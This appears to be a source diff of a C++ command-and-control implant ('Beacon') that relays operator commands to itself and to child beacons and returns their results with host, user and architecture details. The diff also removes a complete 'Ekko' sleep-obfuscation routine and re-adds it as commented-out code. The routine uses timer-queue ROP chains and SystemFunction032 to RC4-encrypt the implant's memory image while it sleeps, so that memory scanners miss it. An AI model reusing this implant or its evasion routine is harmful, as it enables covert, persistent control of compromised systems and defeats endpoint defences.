@@ -259,6 +259,7 @@ Beacon::Beacon(const std::string& ip, int port)
 }
 
 
+// Distribute commands from C2 adress to this beacon and child beacons
 bool Beacon::cmdToTasks(const std::string& input)
 {
 	std::string key="dfsdgferhzdzxczevre5595485sdg";
@@ -272,7 +273,7 @@ bool Beacon::cmdToTasks(const std::string& input)
 	{
 		BundleC2Message* bundleC2Message = multiBundleC2Message.bundlec2messages(k);
 
-		// Handle own tasks
+		// Handle tasks address to this particular Beacon
 		std::string beaconhash = bundleC2Message->beaconhash();
 		if(beaconhash==m_beaconHash)
 		{
@@ -282,7 +283,7 @@ bool Beacon::cmdToTasks(const std::string& input)
 				m_tasks.push(c2Message);
 			}
 		}
-		// handle child sessions tasks
+		// Handle tasks address to child sessions
 		else
 		{
 			for(int i=0; i<m_listeners.size(); i++)
@@ -308,12 +309,13 @@ bool Beacon::cmdToTasks(const std::string& input)
 }
 
 
+// Create the response message from the results of all the commmands send to this beacon and child beacons
 bool Beacon::taskResultsToCmd(std::string& output)
 {
+	// Handle results of commands address to this particular Beacon
 	MultiBundleC2Message multiBundleC2Message;
 	BundleC2Message *bundleC2Message = multiBundleC2Message.add_bundlec2messages();
 
-	// Handle own results
 	bundleC2Message->set_beaconhash(m_beaconHash);
 	bundleC2Message->set_hostname(m_hostname);
 	bundleC2Message->set_username(m_username);
@@ -330,7 +332,7 @@ bool Beacon::taskResultsToCmd(std::string& output)
 		m_taskResult.pop();
 	}
 
-	// handle child sessions results
+	// Handle results of commands address to child sessions
 	for(int i=0; i<m_listeners.size(); i++)
 	{
 		for(int j=0; j<m_listeners[i]->getNumberOfSession(); j++)
@@ -338,12 +340,9 @@ bool Beacon::taskResultsToCmd(std::string& output)
 			std::shared_ptr<Session> ptr = m_listeners[i]->getSessionPtr(j);
 
 			BundleC2Message *bundleC2Message = multiBundleC2Message.add_bundlec2messages();
-
-			// If it's the first listener to handle the message
-			if(bundleC2Message->listenerhash().empty())
-				bundleC2Message->set_listenerhash(m_listeners[i]->getListenerHash());
-
+			
 			bundleC2Message->set_beaconhash(ptr->getBeaconHash());
+			bundleC2Message->set_listenerhash(ptr->getListenerHash());
 			bundleC2Message->set_hostname(ptr->getHostname());
 			bundleC2Message->set_username(ptr->getUsername());
 			bundleC2Message->set_arch(ptr->getArch());
@@ -371,8 +370,11 @@ bool Beacon::taskResultsToCmd(std::string& output)
 	return true;
 }
 
+
+// Execute the right module corresponding to the command received from the C2
 bool Beacon::runTasks()
 {
+	// Handle every task adress to this beacon and put results in a list that will be use to create the response message
 	while(!m_tasks.empty())
 	{
 		C2Message c2Message = m_tasks.front();
@@ -390,129 +392,22 @@ bool Beacon::runTasks()
 			return exit; 
 	}
 
+	// For every listener add a proof of life to the result list that will be use to create the response message
+	// It's usefull in case of link with the beacon die and is then reinstated
+	for(int i=0; i<m_listeners.size(); i++)
+	{
+		C2Message listenerProofOfLife;
+
+		std::string listenerHash = m_listeners[i]->getListenerHash();
+		listenerProofOfLife.set_instruction(ListenerPolCmd);
+		listenerProofOfLife.set_returnvalue(listenerHash);
+
+		m_taskResult.push(listenerProofOfLife);
+	}
+
 	return false;
 }
 
-
-#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
-#define NtCurrentThread() (  ( HANDLE ) ( LONG_PTR ) -2 )
-#define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )
-
-typedef struct {
-    DWORD	Length;
-    DWORD	MaximumLength;
-    PVOID	Buffer;
-} USTRING ;
-
-
-
-VOID EkkoObf( DWORD SleepTime )
-{
-    CONTEXT CtxThread   = { 0 };
-
-    CONTEXT RopProtRW   = { 0 };
-    CONTEXT RopMemEnc   = { 0 };
-    CONTEXT RopDelay    = { 0 };
-    CONTEXT RopMemDec   = { 0 };
-    CONTEXT RopProtRX   = { 0 };
-    CONTEXT RopSetEvt   = { 0 };
-
-    HANDLE  hTimerQueue = NULL;
-    HANDLE  hNewTimer   = NULL;
-    HANDLE  hEvent      = NULL;
-    PVOID   ImageBase   = NULL;
-    DWORD   ImageSize   = 0;
-    DWORD   OldProtect  = 0;
-
-	CHAR KeyBuf[16];
-	unsigned int r = 0;
-	for (int i = 0; i < 16; i++) 
-		KeyBuf[i] = (CHAR) rand();
-
-    USTRING Key         = { 0 };
-    USTRING Img         = { 0 };
-
-    PVOID   NtContinue  = NULL;
-    PVOID   SysFunc032  = NULL;
-
-    hEvent      = CreateEventW( 0, 0, 0, 0 );
-    hTimerQueue = CreateTimerQueue();
-
-    NtContinue  = GetProcAddress( GetModuleHandleA( "Ntdll" ), "NtContinue" );
-    SysFunc032  = GetProcAddress( LoadLibraryA( "Advapi32" ),  "SystemFunction032" );
-
-    ImageBase   = GetModuleHandleA( NULL );
-    ImageSize   = ( ( PIMAGE_NT_HEADERS ) ( (DWORD64) ImageBase + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew ) )->OptionalHeader.SizeOfImage;
-
-    Key.Buffer  = KeyBuf;
-    Key.Length  = Key.MaximumLength = 16;
-
-    Img.Buffer  = ImageBase;
-    Img.Length  = Img.MaximumLength = ImageSize;
-
-    if ( CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)RtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD ) )
-    {
-        WaitForSingleObject( hEvent, 0x32 );
-
-        memcpy( &RopProtRW, &CtxThread, sizeof( CONTEXT ) );
-        memcpy( &RopMemEnc, &CtxThread, sizeof( CONTEXT ) );
-        memcpy( &RopDelay,  &CtxThread, sizeof( CONTEXT ) );
-        memcpy( &RopMemDec, &CtxThread, sizeof( CONTEXT ) );
-        memcpy( &RopProtRX, &CtxThread, sizeof( CONTEXT ) );
-        memcpy( &RopSetEvt, &CtxThread, sizeof( CONTEXT ) );
-
-        // VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
-        RopProtRW.Rsp  -= 8;
-        RopProtRW.Rip   = (DWORD64)VirtualProtect;
-        RopProtRW.Rcx   = (DWORD64)ImageBase;
-        RopProtRW.Rdx   = (DWORD64)ImageSize;
-        RopProtRW.R8    = (DWORD64)PAGE_READWRITE;
-        RopProtRW.R9    = (DWORD64)&OldProtect;
-
-		// "RtlEncryptDecryptRC4"
-        // SystemFunction032( &Key, &Img );
-        RopMemEnc.Rsp  -= 8;
-        RopMemEnc.Rip   = (DWORD64)SysFunc032;
-        RopMemEnc.Rcx   = (DWORD64)&Img;
-        RopMemEnc.Rdx   = (DWORD64)&Key;
-
-        // WaitForSingleObject( hTargetHdl, SleepTime );
-        RopDelay.Rsp   -= 8;
-        RopDelay.Rip    = (DWORD64)WaitForSingleObject;
-        RopDelay.Rcx    = (DWORD64)NtCurrentProcess();
-        RopDelay.Rdx    = (DWORD64)SleepTime;
-
-        // SystemFunction032( &Key, &Img );
-        RopMemDec.Rsp  -= 8;
-        RopMemDec.Rip   = (DWORD64)SysFunc032;
-        RopMemDec.Rcx   = (DWORD64)&Img;
-        RopMemDec.Rdx   = (DWORD64)&Key;
-
-        // VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect );
-        RopProtRX.Rsp  -= 8;
-        RopProtRX.Rip   = (DWORD64)VirtualProtect;
-        RopProtRX.Rcx   = (DWORD64)ImageBase;
-        RopProtRX.Rdx   = (DWORD64)ImageSize;
-        RopProtRX.R8    = (DWORD64)PAGE_EXECUTE_READWRITE;
-        RopProtRX.R9    = (DWORD64)&OldProtect;
-
-        // SetEvent( hEvent );
-        RopSetEvt.Rsp  -= 8;
-        RopSetEvt.Rip   = (DWORD64)SetEvent;
-        RopSetEvt.Rcx   = (DWORD64)hEvent;
-
-        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD );
-        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD );
-        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD );
-        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD );
-        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD );
-        CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD );
-
-        WaitForSingleObject( hEvent, INFINITE );
-    }
-
-    DeleteTimerQueue( hTimerQueue );
-}
 
 void Beacon::sleep()
 {
@@ -532,7 +427,9 @@ void Beacon::sleep()
 }
 
 
-// Main function that execute cmd
+// Main function that execute command comming from the C2
+// Commands releated to modules are handle by them
+// Commands releated to beacon internal functions are handle in this function
 bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 {
 	string instruction = c2Message.instruction();
@@ -730,6 +627,7 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 		c2RetMessage.set_returnvalue(msg);
 #endif
 	}
+	// Command to be executed by a loaded module
 	else
 	{
 		bool isModuleFound=false;
@@ -754,4 +652,122 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 }
 
 
+// #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
+// #define NtCurrentThread() (  ( HANDLE ) ( LONG_PTR ) -2 )
+// #define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )
 
+// typedef struct {
+//     DWORD	Length;
+//     DWORD	MaximumLength;
+//     PVOID	Buffer;
+// } USTRING ;
+
+
+
+// VOID EkkoObf( DWORD SleepTime )
+// {
+//     CONTEXT CtxThread   = { 0 };
+
+//     CONTEXT RopProtRW   = { 0 };
+//     CONTEXT RopMemEnc   = { 0 };
+//     CONTEXT RopDelay    = { 0 };
+//     CONTEXT RopMemDec   = { 0 };
+//     CONTEXT RopProtRX   = { 0 };
+//     CONTEXT RopSetEvt   = { 0 };
+
+//     HANDLE  hTimerQueue = NULL;
+//     HANDLE  hNewTimer   = NULL;
+//     HANDLE  hEvent      = NULL;
+//     PVOID   ImageBase   = NULL;
+//     DWORD   ImageSize   = 0;
+//     DWORD   OldProtect  = 0;
+
+// 	CHAR KeyBuf[16];
+// 	unsigned int r = 0;
+// 	for (int i = 0; i < 16; i++) 
+// 		KeyBuf[i] = (CHAR) rand();
+
+//     USTRING Key         = { 0 };
+//     USTRING Img         = { 0 };
+
+//     PVOID   NtContinue  = NULL;
+//     PVOID   SysFunc032  = NULL;
+
+//     hEvent      = CreateEventW( 0, 0, 0, 0 );
+//     hTimerQueue = CreateTimerQueue();
+
+//     NtContinue  = GetProcAddress( GetModuleHandleA( "Ntdll" ), "NtContinue" );
+//     SysFunc032  = GetProcAddress( LoadLibraryA( "Advapi32" ),  "SystemFunction032" );
+
+//     ImageBase   = GetModuleHandleA( NULL );
+//     ImageSize   = ( ( PIMAGE_NT_HEADERS ) ( (DWORD64) ImageBase + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew ) )->OptionalHeader.SizeOfImage;
+
+//     Key.Buffer  = KeyBuf;
+//     Key.Length  = Key.MaximumLength = 16;
+
+//     Img.Buffer  = ImageBase;
+//     Img.Length  = Img.MaximumLength = ImageSize;
+
+//     if ( CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)RtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD ) )
+//     {
+//         WaitForSingleObject( hEvent, 0x32 );
+
+//         memcpy( &RopProtRW, &CtxThread, sizeof( CONTEXT ) );
+//         memcpy( &RopMemEnc, &CtxThread, sizeof( CONTEXT ) );
+//         memcpy( &RopDelay,  &CtxThread, sizeof( CONTEXT ) );
+//         memcpy( &RopMemDec, &CtxThread, sizeof( CONTEXT ) );
+//         memcpy( &RopProtRX, &CtxThread, sizeof( CONTEXT ) );
+//         memcpy( &RopSetEvt, &CtxThread, sizeof( CONTEXT ) );
+
+//         // VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
+//         RopProtRW.Rsp  -= 8;
+//         RopProtRW.Rip   = (DWORD64)VirtualProtect;
+//         RopProtRW.Rcx   = (DWORD64)ImageBase;
+//         RopProtRW.Rdx   = (DWORD64)ImageSize;
+//         RopProtRW.R8    = (DWORD64)PAGE_READWRITE;
+//         RopProtRW.R9    = (DWORD64)&OldProtect;
+
+// 		// "RtlEncryptDecryptRC4"
+//         // SystemFunction032( &Key, &Img );
+//         RopMemEnc.Rsp  -= 8;
+//         RopMemEnc.Rip   = (DWORD64)SysFunc032;
+//         RopMemEnc.Rcx   = (DWORD64)&Img;
+//         RopMemEnc.Rdx   = (DWORD64)&Key;
+
+//         // WaitForSingleObject( hTargetHdl, SleepTime );
+//         RopDelay.Rsp   -= 8;
+//         RopDelay.Rip    = (DWORD64)WaitForSingleObject;
+//         RopDelay.Rcx    = (DWORD64)NtCurrentProcess();
+//         RopDelay.Rdx    = (DWORD64)SleepTime;
+
+//         // SystemFunction032( &Key, &Img );
+//         RopMemDec.Rsp  -= 8;
+//         RopMemDec.Rip   = (DWORD64)SysFunc032;
+//         RopMemDec.Rcx   = (DWORD64)&Img;
+//         RopMemDec.Rdx   = (DWORD64)&Key;
+
+//         // VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect );
+//         RopProtRX.Rsp  -= 8;
+//         RopProtRX.Rip   = (DWORD64)VirtualProtect;
+//         RopProtRX.Rcx   = (DWORD64)ImageBase;
+//         RopProtRX.Rdx   = (DWORD64)ImageSize;
+//         RopProtRX.R8    = (DWORD64)PAGE_EXECUTE_READWRITE;
+//         RopProtRX.R9    = (DWORD64)&OldProtect;
+
+//         // SetEvent( hEvent );
+//         RopSetEvt.Rsp  -= 8;
+//         RopSetEvt.Rip   = (DWORD64)SetEvent;
+//         RopSetEvt.Rcx   = (DWORD64)hEvent;
+
+//         CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD );
+//         CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD );
+//         CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD );
+//         CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD );
+//         CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD );
+//         CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD );
+
+//         WaitForSingleObject( hEvent, INFINITE );
+//     }
+
+//     DeleteTimerQueue( hTimerQueue );
+// }
